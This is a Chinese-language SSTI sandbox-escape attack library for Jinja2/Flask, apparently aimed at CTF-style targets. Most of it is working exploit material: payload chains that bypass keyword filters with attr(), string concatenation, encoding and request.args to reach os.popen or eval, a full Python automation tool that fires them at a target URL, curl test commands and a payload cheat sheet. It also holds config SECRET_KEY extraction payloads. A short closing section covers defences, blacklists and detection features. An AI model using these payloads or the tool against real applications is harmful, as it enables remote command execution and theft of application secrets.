# SSTI - 沙箱逃逸攻击库

## 概述

SSTI沙箱逃逸是指当应用程序实施了某些过滤措施(如过滤双下划线`__`、`config`等关键字)时,攻击者通过各种技巧绕过这些限制,最终实现模板注入和命令执行。常见绕过技术包括使用`attr()`函数、字符串拼接、编码等。

**核心威胁**: 关键字过滤 → attr()绕过 → 获取危险对象 → 命令执行

## 沙箱过滤机制

### 常见过滤

```python
# 过滤双下划线
if '__' in user_input:
    return "Blocked"

# 过滤config
if 'config' in user_input:
    return "Blocked"

# 过滤常见属性
blacklist = ['__class__', '__bases__', '__subclasses__', 
             'config', 'self', 'request']
for word in blacklist:
    if word in user_input:
        return "Blocked"

# 过滤危险函数
if 'eval' in user_input or 'exec' in user_input:
    return "Blocked"
```

### 渲染用户输入

```python
from flask import render_template_string

@app.route('/ssti')
def ssti():
    user_input = request.args.get('input', '')
    
    # 过滤后渲染
    if '__' in user_input or 'config' in user_input:
        return "Blocked"
    
    return render_template_string(user_input)
```

## 核心攻击技术

### 1. attr()函数绕过双下划线

**技术**: 使用`attr()`函数动态访问属性,绕过`__`过滤

```jinja2
# 被过滤
{{''.__class__}}

# 绕过: 使用attr()
{{''|attr('__class__')}}
{{''|attr('_''_class_''_')}}

# 完整利用链
{{lipsum|attr('__globals__')}}
{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('whoami')|attr('read')()}}
```

**原理**: `attr(name)`等价于`object.name`,但name是字符串,不会被双下划线过滤检测到

### 2. 字符串拼接绕过

**技术**: 将关键字拆分拼接,绕过简单的字符串匹配

```jinja2
# 被过滤
{{'__class__'}}

# 绕过: 字符串拼接
{{'_''_class_''_'}}
{{('_'*2)+'class'+('_'*2)}}
{{'__'+'class'+'__'}}

# 完整示例
{{''|attr('_'+'_class_'+'_')}}
```

### 3. 使用lipsum/cycler等内置对象

**技术**: Jinja2内置对象可用于访问`__globals__`

```jinja2
# lipsum对象
{{lipsum}}
# <function generate_lorem_ipsum at 0x...>

# 访问__globals__
{{lipsum|attr('__globals__')}}

# 执行命令
{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}

# cycler对象
{{cycler|attr('__init__')|attr('__globals__')}}
```

**可用对象**:
- `lipsum` - 生成占位文本的函数
- `cycler` - 循环器对象
- `joiner` - 连接器对象
- `namespace` - 命名空间对象

### 4. request对象利用

**技术**: 通过request对象访问应用上下文

```jinja2
# 访问config (绕过config关键字过滤)
{{request|attr('application')|attr('__globals__')}}
{{request|attr('environ')}}

# 通过request.args传递危险字符串
{{''|attr(request.args.x)}}
# URL: ?input={{''|attr(request.args.x)}}&x=__class__
```

### 5. 编码绕过

**技术**: 使用各种编码方式绕过过滤

```jinja2
# Unicode编码
{{\u005f\u005fclass\u005f\u005f}}

# Hex编码
{{'__class__'|replace('_','\x5f')}}

# Base64 (需要解码函数)
{{''|attr('X19jbGFzc19f'|b64decode)}}
```

### 6. 过滤器链绕过

**技术**: 利用Jinja2过滤器链构造复杂逻辑

```jinja2
# 使用过滤器拼接
{{''|attr(('__'+'class'+'__'))}}

# 使用map过滤器
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()}}

# 使用select过滤器选择
{{''.__class__.__mro__[1].__subclasses__()|select('match','.*Popen.*')|list}}
```

### 7. 字典访问绕过

**技术**: 使用字典key访问而非属性访问

```jinja2
# 属性访问 (被过滤)
{{config.SECRET_KEY}}

# 字典访问 (绕过)
{{config['SECRET_KEY']}}
{{config|attr('get')('SECRET_KEY')}}

# 通过__getitem__
{{config|attr('__getitem__')('SECRET_KEY')}}
```

## 完整攻击工具

### SSTI沙箱逃逸自动化工具

```python
#!/usr/bin/env python3
"""
SSTI沙箱逃逸自动化利用工具
支持多种绕过技术
"""

import requests
import sys
import urllib.parse

class SSTISandboxEscape:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        
    def test_injection(self, payload):
        """
        测试SSTI payload
        
        Args:
            payload: 测试载荷
        
        Returns:
            响应对象
        """
        try:
            params = {'input': payload}
            r = self.session.post(self.target + '/ssti', 
                                 data=params, 
                                 timeout=10)
            return r
        except Exception as e:
            print(f"[-] 请求错误: {e}")
            return None
    
    def detect_filters(self):
        """
        检测过滤规则
        
        Returns:
            被过滤的关键字列表
        """
        print("[*] 检测过滤规则...")
        
        test_keywords = [
            '__', '{{', 'class', 'subclasses', 
            'config', 'self', 'request', 'eval', 'exec'
        ]
        
        blocked = []
        
        for keyword in test_keywords:
            r = self.test_injection(keyword)
            if r and ('blocked' in r.text.lower() or 
                     'filtered' in r.text.lower() or
                     r.status_code == 403):
                blocked.append(keyword)
                print(f"[!] 过滤关键字: {keyword}")
        
        return blocked
    
    def bypass_attr_filter(self, command='whoami'):
        """
        使用attr()绕过双下划线过滤
        
        Args:
            command: 要执行的命令
        
        Returns:
            响应文本
        """
        print(f"[*] 使用attr()绕过 - 命令: {command}")
        
        # 构造payload
        payloads = [
            # lipsum对象
            f"{{{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('{command}')|attr('read')()}}}}",
            
            # 字符串拼接
            f"{{{{''|attr('_'+'_class_'+'_')|attr('_'+'_mro_'+'_')|attr('_'+'_getitem_'+'_')(1)|attr('_'+'_subclasses_'+'_')()}}}}",
            
            # cycler对象
            f"{{{{cycler|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('{command}')|attr('read')()}}}}",
        ]
        
        for i, payload in enumerate(payloads, 1):
            print(f"[{i}] 尝试: {payload[:60]}...")
            r = self.test_injection(payload)
            
            if r and r.status_code == 200:
                if 'blocked' not in r.text.lower():
                    print(f"[+] Payload成功!")
                    print(f"[+] 响应:\n{r.text[:500]}")
                    
                    if 'flag' in r.text.lower():
                        return r.text
        
        return None
    
    def bypass_string_concat(self, command='id'):
        """
        使用字符串拼接绕过
        
        Args:
            command: 要执行的命令
        
        Returns:
            响应文本
        """
        print(f"[*] 使用字符串拼接绕过...")
        
        # 拼接关键字
        payloads = [
            # __class__拼接
            "{{''|attr('_'+'_class_'+'_')}}",
            "{{''|attr(('_'*2)+'class'+('_'*2))}}",
            
            # 完整RCE
            f"{{{{''|attr('_'+'_class_'+'_')|attr('_'+'_mro_'+'_')|attr('_'+'_getitem_'+'_')(1)|attr('_'+'_subclasses_'+'_')()|attr('_'+'_getitem_'+'_')(396)}}}}",
        ]
        
        for payload in payloads:
            print(f"[*] 尝试: {payload[:80]}...")
            r = self.test_injection(payload)
            
            if r and r.status_code == 200 and 'blocked' not in r.text.lower():
                print(f"[+] 绕过成功!")
                print(f"[+] 响应: {r.text[:300]}")
                return r.text
        
        return None
    
    def bypass_request_args(self):
        """
        使用request.args绕过
        
        Returns:
            响应文本
        """
        print("[*] 使用request.args绕过...")
        
        # Payload: {{''|attr(request.args.x)}}
        # URL参数: &x=__class__
        
        try:
            payload = "{{''|attr(request.args.x)}}"
            params = {
                'input': payload,
                'x': '__class__'
            }
            
            r = self.session.post(self.target + '/ssti', 
                                 data=params, 
                                 timeout=10)
            
            if r and r.status_code == 200:
                print(f"[+] request.args绕过成功!")
                print(f"[+] 响应: {r.text[:300]}")
                return r.text
                
        except Exception as e:
            print(f"[-] 错误: {e}")
        
        return None
    
    def full_exploit(self, command='cat /flag'):
        """
        完整利用流程
        
        Args:
            command: 要执行的命令
        """
        print("=" * 60)
        print("[*] SSTI沙箱逃逸完整利用")
        print("=" * 60)
        
        # 1. 检测过滤
        blocked = self.detect_filters()
        print(f"\n[*] 发现{len(blocked)}个过滤关键字")
        
        print()
        
        # 2. 尝试attr()绕过
        print("[*] 步骤1: attr()函数绕过...")
        result = self.bypass_attr_filter(command)
        if result and 'flag' in result.lower():
            import re
            flag = re.search(r'flag\{[^}]+\}', result, re.I)
            if flag:
                print(f"\n[+] FLAG: {flag.group()}")
                return True
        
        print()
        
        # 3. 尝试字符串拼接
        print("[*] 步骤2: 字符串拼接绕过...")
        result = self.bypass_string_concat()
        if result:
            return True
        
        print()
        
        # 4. 尝试request.args
        print("[*] 步骤3: request.args绕过...")
        result = self.bypass_request_args()
        if result:
            return True
        
        return False

def exploit_ssti_sandbox_escape(target_url, command='cat /flag'):
    """
    SSTI沙箱逃逸利用入口
    
    Args:
        target_url: 目标URL
        command: 要执行的命令
    """
    print(f"[*] 目标: {target_url}")
    print(f"[*] 命令: {command}")
    print()
    
    exploiter = SSTISandboxEscape(target_url)
    success = exploiter.full_exploit(command)
    
    if success:
        print("\n[+] 攻击成功!")
    else:
        print("\n[-] 攻击未成功")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法:")
        print(f"  {sys.argv[0]} <target_url> [command]")
        print()
        print("示例:")
        print(f"  {sys.argv[0]} http://target/ssti")
        print(f"  {sys.argv[0]} http://target/ssti 'cat /flag'")
        sys.exit(1)
    
    target = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else 'cat /flag'
    
    exploit_ssti_sandbox_escape(target, command)
```

## 实战场景

### 场景1: 过滤双下划线

**过滤规则**:
```python
if '__' in user_input:
    return "Blocked"
```

**绕过**:
```jinja2
# 使用attr()
{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('whoami')|attr('read')()}}
```

### 场景2: 过滤config

```python
if 'config' in user_input:
    return "Blocked"
```

**绕过**:
```jinja2
# 通过request访问
{{request.application.__self__._get_data_for_json|attr('__globals__')}}

# 字符串拼接
{{'con'+'fig'}}
```

### 场景3: 同时过滤多个关键字

```python
blacklist = ['__', 'config', 'class', 'subclass']
```

**绕过**:
```jinja2
# attr() + 字符串拼接
{{lipsum|attr('_'+'_globals_'+'_')|attr('_'+'_getitem_'+'_')('os')|attr('popen')('id')|attr('read')()}}

# request.args
{{''|attr(request.args.a)}}
# URL: &a=__class__
```

## 手动测试命令

### 检测过滤

```bash
# 测试双下划线
curl -X POST http://target/ssti -d "input=__"

# 测试class
curl -X POST http://target/ssti -d "input=class"

# 测试完整payload
curl -X POST http://target/ssti -d "input={{''.__class__}}"
```

### attr()绕过测试

```bash
# 基础测试
curl -X POST http://target/ssti \
  -d "input={{lipsum|attr('__globals__')}}"

# 执行命令
curl -X POST http://target/ssti \
  -d "input={{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cat /flag')|attr('read')()}}"
```

## Payload速查表

### attr()绕过双下划线
```jinja2
{{''|attr('__class__')}}
{{lipsum|attr('__globals__')}}
{{cycler|attr('__init__')|attr('__globals__')}}
```

### 字符串拼接
```jinja2
{{''|attr('_'+'_class_'+'_')}}
{{''|attr(('_'*2)+'class'+('_'*2))}}
{{'_'*2+'class'+'_'*2}}
```

### 完整RCE链
```jinja2
# 使用lipsum
{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cmd')|attr('read')()}}

# 使用request
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("cmd").read()')}}

# 使用cycler
{{cycler|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cmd')|attr('read')()}}
```

### request.args绕过
```jinja2
{{''|attr(request.args.x)}}
# URL参数: &x=__class__

{{config|attr(request.args.a)(request.args.b)}}
# URL参数: &a=__getitem__&b=SECRET_KEY
```

## 防御措施

### 1. 使用沙箱环境

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(user_input)
```

### 2. 禁用危险函数

```python
# 自定义过滤器白名单
safe_filters = ['upper', 'lower', 'capitalize']
env.filters = {k: v for k, v in env.filters.items() if k in safe_filters}
```

### 3. 严格的输入验证

```python
import re

# 只允许字母数字空格
if not re.match(r'^[a-zA-Z0-9\s]+$', user_input):
    raise ValueError("Invalid input")

# 黑名单检测(不推荐,容易绕过)
dangerous = ['__', 'attr', 'config', 'class', 'mro', 'subclass', 'globals']
for word in dangerous:
    if word in user_input.lower():
        raise ValueError("Blocked")
```

### 4. 不要渲染用户输入

```python
# 最安全的做法: 根本不渲染用户输入
# 使用预定义模板 + 变量替换

template = env.get_template('safe_template.html')
return template.render(user_data=user_input)  # user_input作为数据,不是模板
```

## 检测特征

1. **attr()函数**: 大量使用`|attr()`
2. **字符串拼接**: `'_'+'_class_'+'_'`
3. **内置对象**: `lipsum`, `cycler`, `joiner`
4. **request.args**: 动态属性名
5. **长payload**: 复杂的过滤器链

## 总结

SSTI沙箱逃逸需要根据具体过滤规则选择绕过技术:
- 过滤`__`: 使用`attr()`函数
- 过滤关键字: 字符串拼接或request.args
- 过滤对象: 使用其他内置对象(lipsum/cycler等)
- 多重过滤: 组合多种绕过技术

**关键攻击路径**: 检测过滤规则 → 选择绕过技术 → 构造完整利用链 → 执行命令

**防御重点**: 使用沙箱环境,禁用危险函数,最好不要将用户输入作为模板渲染。
